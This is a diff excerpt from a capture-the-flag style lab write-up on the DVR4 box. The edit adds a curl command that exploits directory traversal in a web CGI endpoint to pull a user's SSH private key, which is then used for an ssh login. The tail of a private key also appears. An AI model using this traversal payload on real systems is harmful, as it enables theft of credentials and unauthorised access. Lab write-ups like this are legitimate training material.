@@ -340,11 +340,11 @@ L2ZcnCRyN859P/AAAAFnZpZXdlckBERVNLVE9QLThPQjJDT1ABAgME
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-The private key is manually copied to our Kali machine and we try to login.
+The private key is saved and we try to login.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
-└─$ vi id_rsa_viewer
+└─$ curl "http://$TARGET_IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" > id_rsa_viewer
 
 ┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Practice/Intermediate/DVR4]
 └─$ ssh -i id_rsa_viewer viewer@$TARGET_IP 
